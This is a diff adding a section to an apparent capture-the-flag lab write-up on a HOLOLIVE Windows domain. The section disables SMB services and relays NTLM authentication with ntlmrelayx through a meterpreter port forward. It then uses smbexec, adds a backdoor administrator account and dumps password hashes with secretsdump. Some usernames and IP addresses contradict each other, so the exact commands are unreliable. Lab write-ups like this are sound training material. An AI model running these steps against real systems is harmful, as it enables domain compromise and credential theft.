@@ -527,3 +527,51 @@ runas /user:adm1n powershell.exe
 
 PC-FILESRV01\adm1n
 ```
+- From the administrator desktop we can grab the root flag.
+- For further movement, we have to set up NTLM rely on to capture the smb traffic
+- I ran the below commands on the target host.
+```powershell
+sc stop netlogon
+sc stop lanmanserver
+sc config lanmanserver start= disabled
+sc stop lanmanworkstation
+sc config lanmanworkstation start= disabled
+shutdown -r
+```
+- Then I set up **ntlmrelax** to intercept the traffic.
+```powershell
+ntlmrelayx.py -t smb://10.200.112.30 -smb2support -socks
+```
+- After rebooting the machine, I set up the meterpreter shell and run the below commands to forward the port.
+```meterpreter
+portfwd add -R -L 0.0.0.0 -l 445 -p 445
+```
+- After some time, I got traffic through ntlmrelax
+```meterpreter
+ntlmrelayx> [-] Unsupported MechType 'MS KRB5 - Microsoft Kerberos 5' 
+[*] SMBD-Thread-15: Connection from HOLOLIVE/SRV-ADMIN@127.0.0.1 controlled, attacking target smb://10.200.112.30
+[-] Unsupported MechType 'MS KRB5 - Microsoft Kerberos 5' 
+[*] Authenticating against smb://10.200.112.30 as HOLOLIVE/SRV-ADMIN SUCCEED
+[*] SOCKS: Adding HOLOLIVE/SRV-ADMIN@10.200.112.30(445) to active SOCKS connection. Enjoy
+```
+- As ntlmrelax uses port 1080 for port forward, so I add port 1080 in the proxychains4.conf
+- Using smbexec I got login.
+```powershell
+smbexec HOLOLIVE/SRV-ADMIN@10.200.114.30 -no-pass
+
+C:\Windows\system32>
+```
+- As we do not have a Password for the administrator so I add a new user to the Administrators group and by using secretsdump.py I dump hashes.
+```powershell
+net user the singhsec Password123! /add
+
+net localgroup Administrators /add MyNewUser
+
+
+secretsdump.py 'HOLOLIVE/thesinghsec:Password123!@10.200.112.30'
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:70017854acf6ea8d2af520eddcc866fb:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+```
+- After cracking the hash, I log in using the administrator's credentials and found a root flag on the desktop.
